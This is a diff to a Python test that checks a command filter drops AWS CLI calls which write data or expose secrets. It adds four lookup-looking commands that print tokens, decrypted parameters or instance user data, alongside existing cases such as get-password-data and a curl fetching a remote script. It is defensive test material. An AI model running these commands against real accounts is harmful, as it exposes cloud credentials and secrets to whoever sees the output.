@@ -32,6 +32,11 @@ def test_write_or_secret_commands_are_dropped():
         "aws s3api get-object --bucket frothlybucket --key a.txt out.txt",
         "aws ec2 get-password-data --instance-id i-0a1b2c3d4e5f60718",
         "curl http://198.51.100.7/x.sh",
+        # 재검토에서 찾음: 조회 모양이지만 토큰·비밀값을 화면에 낸다
+        "aws eks get-token --cluster-name prod",
+        "aws ssm get-parameter-history --name db-password --with-decryption",
+        "aws ssm get-command-invocation --command-id x --instance-id i-0a1b2c3d4e5f60718",
+        "aws ec2 describe-instance-attribute --instance-id i-0a1b2c3d4e5f60718 --attribute userData",
     ]:
         kept, rep = run(cmd)
         assert kept == [] and rep["dropped"], cmd
